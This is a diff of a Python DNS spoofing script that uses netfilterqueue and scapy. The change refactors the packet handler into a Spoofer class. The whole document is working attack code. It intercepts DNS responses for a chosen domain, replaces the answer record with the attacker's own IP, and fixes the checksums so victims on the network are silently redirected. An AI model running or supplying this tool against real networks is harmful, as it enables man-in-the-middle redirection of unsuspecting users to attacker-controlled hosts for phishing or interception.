@@ -5,10 +5,41 @@ import netfilterqueue
 import scapy.all as scapy
 from modules.my_utils import show_message
 from modules.net_utils import get_ip
-from modules.sys_utils import check_root, setup_nfqueue, enable_rules, disable_rules
+from modules.sys_utils import check_root, setup_nfqueue
 from modules.exit_handler import setup_signal_handler
 
-### Functions #############################################################################################################
+### Classes #########################################################################################################################
+
+class Spoofer:
+
+    def __init__(self, domain, ip):
+        self.domain = domain
+        self.ip = ip
+
+    def process_packet(self, packet):
+        scapy_packet = scapy.IP(packet.get_payload())
+        
+        if scapy_packet.haslayer(scapy.DNS) and scapy_packet.haslayer(scapy.DNSQR) and scapy_packet.haslayer(scapy.DNSRR):
+            qname = scapy_packet[scapy.DNSQR].qname
+
+            if self.domain.encode() in qname:
+                show_message("Envenenando el dominio:", "minus", self.domain)
+                answer = scapy.DNSRR(rrname=qname, rdata=self.ip)
+                scapy_packet[scapy.DNS].an = answer
+                scapy_packet[scapy.DNS].ancount = 1
+
+                # Elimina camps per recalcular checksum i longitud
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].len
+                del scapy_packet[scapy.UDP].chksum
+
+                packet.set_payload(scapy_packet.build())
+
+        packet.accept()
+
+
+### Functions #######################################################################################################################
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="DNS Spoofer")
@@ -18,60 +49,23 @@ def get_arguments():
     options = parser.parse_args()
     return options.domain, options.interface
 
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-
-    if scapy_packet.haslayer(scapy.DNS) and scapy_packet.haslayer(scapy.DNSQR):
-        qname = scapy_packet[scapy.DNSQR].qname.decode()
-
-        # Normalitza qname i domain per comparar sense el punt final
-        qname_clean = qname.rstrip('.').lower()
-        domain_clean = DOMAIN.lower().rstrip('.')
-
-        if domain_clean == qname_clean:
-            show_message("Envenenando el dominio:", "minus", DOMAIN)
-
-            # Construeix la resposta
-            answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata=IP)
-
-            # Posa el flag QR a 1 (resposta)
-            scapy_packet[scapy.DNS].qr = 1
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
-            scapy_packet[scapy.DNS].qdcount = 1
-            scapy_packet[scapy.DNS].nscount = 0
-            scapy_packet[scapy.DNS].arcount = 0
-            scapy_packet[scapy.DNS].rcode = 0
-            # Manté la mateixa ID
-            # Resposta sobreescriu només el camp an i anc
-
-            # Elimina camps per recalcular checksum i longitud
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].len
-            del scapy_packet[scapy.UDP].chksum
-
-            packet.set_payload(bytes(scapy_packet))
-
-    packet.accept()
-
-
+### Main Code #######################################################################################################################
 
 def main():
-
     check_root()
     setup_signal_handler()
     show_message("Executing:", "info", "DNS Spoofer")
 
-    global DOMAIN, interface, IP
-    DOMAIN, interface = get_arguments()
-    IP = get_ip(interface)
+    domain, interface = get_arguments()
+    ip = get_ip(interface)
 
     setup_nfqueue()
 
+    dns_spoofer = Spoofer(domain, ip)
+
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
+    queue.bind(0, dns_spoofer.process_packet)
     queue.run()
-    
+
 if __name__ == "__main__":
     main()
